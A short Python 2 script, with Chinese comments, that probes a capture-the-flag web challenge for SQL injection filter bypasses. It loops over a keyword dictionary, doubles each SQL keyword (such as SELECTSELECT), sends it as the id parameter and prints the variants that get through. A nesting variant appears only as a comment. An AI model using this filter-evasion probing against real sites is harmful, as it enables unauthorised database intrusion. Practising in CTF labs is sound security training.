# -*- coding: utf-8 -*-
import urllib2
import urllib
#脚本应用于get请求单框注入情况下
#定义一个url
url='http://ctf5.shiyanbar.com/423/web/?id=';
#定义关键字测试使用的载荷库



#绕过测试方式1——关键字*重复*：如SELECTSELECT
for line in open("dict/sql_special_keyword.txt"):
    # print get_md5(line.strip()) + ':' + line
    line=line.replace("\n","")
    line=line[0:len(line)-1]+line+line[len(line)-1]
    print url+line
    req = urllib2.Request(url+line)
    res = urllib2.urlopen(req).read()
    if(res.find(line.lower())>-1):
        print line
#绕过测试方式1——关键字*嵌套*：如SELSELECTECT

